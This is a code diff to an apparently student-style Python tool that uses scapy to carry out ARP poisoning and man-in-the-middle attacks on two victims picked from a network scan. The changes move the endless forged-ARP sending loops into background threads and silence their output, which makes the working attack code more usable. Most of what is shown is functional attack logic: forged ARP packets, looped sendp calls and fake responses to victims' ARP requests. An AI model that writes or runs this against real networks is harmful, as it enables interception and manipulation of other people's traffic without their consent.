@@ -1,6 +1,7 @@
-from neighbourhood import start_scan
-from utilities import get_my_mac_address, get_mac_address
+from .neighbourhood import start_scan
+from .utilities import get_my_mac_address, get_mac_address
 import argparse
+import threading
 from scapy.all import Ether, ARP, sendp, sniff
 
 class Address:
@@ -31,7 +32,7 @@ def send_all_out_mitm_ARP(interface, mac_attacker, victim1, victim2):
     arp1 = create_ARP(mac_attacker, victim1, victim2)
     arp2 = create_ARP(mac_attacker, victim2, victim1)
 
-    sendp([arp1, arp2], iface=interface, loop=1, inter=1)
+    sendp([arp1, arp2], iface=interface, loop=1, inter=1, verbose=False)
 
 def fake_response(pkt, interface, victim1, victim2):
     if pkt[ARP].op == 1 and (pkt[ARP].pdst == victim2.ip and pkt[ARP].psrc == victim1.ip):
@@ -67,17 +68,25 @@ def mitm_attack(victim1, victim2, interface, silent):
 
     print('Man In The Middle Attack\n')
     if silent:
-        silent_mitm_ARP_poisoning(victim1, victim2)
+        '''silent_mitm_ARP_poisoning(victim1, victim2)'''
+        send_thread = threading.Thread(target=silent_mitm_ARP_poisoning, args=(victim1, victim2))
     else:
-        send_all_out_mitm_ARP(interface, get_my_mac_address(interface), victim1, victim2)
+        '''send_all_out_mitm_ARP(interface, get_my_mac_address(interface), victim1, victim2)'''
+        send_thread = threading.Thread(target=send_all_out_mitm_ARP, args=(interface, get_my_mac_address(interface), victim1, victim2))
+    
+    send_thread.start()
 
 def spoof_attack(victim1, victim2, interface, silent):
 
     print('Spoofing Attack\n')
     if silent:
-        silent_ARP_poisoning(victim1, victim2)
+        '''silent_ARP_poisoning(victim1, victim2)'''
+        send_thread = threading.Thread(target=silent_ARP_poisoning, args=(victim1, victim2))
     else:
-        send_all_out_ARP(interface, get_my_mac_address(interface), victim1, victim2)
+        '''send_all_out_ARP(interface, get_my_mac_address(interface), victim1, victim2)'''
+        send_thread = threading.Thread(target=send_all_out_ARP, args=(interface, get_my_mac_address(interface), victim1, victim2))
+    
+    send_thread.start()
 
 def choose_victims(scan_list):
     print('Choose first victim from list:')
